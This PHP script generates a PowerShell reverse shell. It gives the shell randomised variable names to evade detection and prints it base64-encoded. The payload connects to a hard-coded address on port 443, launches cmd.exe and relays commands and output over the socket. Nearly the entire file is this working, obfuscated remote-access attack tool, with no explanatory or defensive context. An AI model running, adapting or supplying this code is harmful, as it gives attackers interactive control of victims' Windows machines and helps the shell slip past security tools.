<?php

function polymorphThis($len)
{
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$randVar = '$';
    	for ($i = 0; $i <= $len; $i++)
	{
		$randVar.= $chars[rand(0, strlen($chars) - 1)];
	}
	return $randVar;
}

$client = polymorphThis(rand(2, 8));
$true = '$true';
$process = polymorphThis(rand(2, 8));
$null = '$null';
$address = polymorphThis(rand(2, 8));
$port = polymorphThis(rand(2, 8));
$stream = polymorphThis(rand(2, 8));
$networkbuffer = polymorphThis(rand(2, 8));
$inputstream = polymorphThis(rand(2, 8));
$outputstream = polymorphThis(rand(2, 8));
$encoding = polymorphThis(rand(2, 8));
$out = polymorphThis(rand(2, 8));
$done = polymorphThis(rand(2, 8));
$false = '$false';
$testing = polymorphThis(rand(2, 8));
$pos = polymorphThis(rand(2, 8));
$i = polymorphThis(rand(2, 8));
$read = polymorphThis(rand(2, 8));
$string = polymorphThis(rand(2, 8));


$payload = 'function cleanup {
if ('.$client.'.Connected -eq '.$true.') {'.$client.'.Close()};
if ('.$process.'.ExitCode -ne '.$null.') {'.$process.'.Close()};
exit 0;
}

'.$address.' = "192.168.1.16";
'.$port.' = "443";

'.$client.' = New-Object system.net.sockets.tcpclient;
'.$client.'.connect('.$address.','.$port.');

'.$stream.' = '.$client.'.GetStream();
'.$networkbuffer.' = New-Object System.Byte[] '.$client.'.ReceiveBufferSize;

'.$process.' = New-Object System.Diagnostics.Process;
'.$process.'.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe";
'.$process.'.StartInfo.RedirectStandardInput = 1;
'.$process.'.StartInfo.RedirectStandardOutput = 1;
'.$process.'.StartInfo.UseShellExecute = 0;
'.$process.'.Start();

'.$inputstream.' = '.$process.'.StandardInput;
'.$outputstream.' = '.$process.'.StandardOutput;

Start-Sleep 1;

'.$encoding.' = new-object System.Text.AsciiEncoding;

while('.$outputstream.'.Peek() -ne -1)
{
    '.$out.' += '.$encoding.'.GetString('.$outputstream.'.Read());
}

'.$stream.'.Write('.$encoding.'.GetBytes('.$out.'),0,'.$out.'.Length);
'.$out.' = '.$null.'; '.$done.' = '.$false.'; '.$testing.' = 0;

    while (-not '.$done.')
    {
        if ('.$client.'.Connected -ne '.$true.') {cleanup}
        '.$pos.' = 0;
        '.$i.' = 1;
        while (('.$i.' -gt 0) -and ('.$pos.' -lt '.$networkbuffer.'.Length)) {
        '.$read.' = '.$stream.'.Read('.$networkbuffer.','.$pos.','.$networkbuffer.'.Length - '.$pos.');
        '.$pos.'+='.$read.'; if ('.$pos.' -and ('.$networkbuffer.'[0..$('.$pos.'-1)] -contains 10)) {break}};
        if ('.$pos.' -gt 0) {
        '.$string.' = '.$encoding.'.GetString('.$networkbuffer.',0,'.$pos.');
        '.$inputstream.'.write('.$string.');
        start-sleep 1;
        if ('.$process.'.ExitCode -ne '.$null.') {cleanup}
        else {
            '.$out.' = '.$encoding.'.GetString('.$outputstream.'.Read());
            while('.$outputstream.'.Peek() -ne -1)
            {
                '.$out.' += '.$encoding.'.GetString('.$outputstream.'.Read()); if ('.$out.' -eq '.$string.') {'.$out.' = ""};
            }
            '.$stream.'.Write('.$encoding.'.GetBytes('.$out.'),0,'.$out.'.length);
            '.$out.' = '.$null.';
            '.$string.' = '.$null.';
        }
    } else {cleanup}
}';


echo base64_encode($payload);
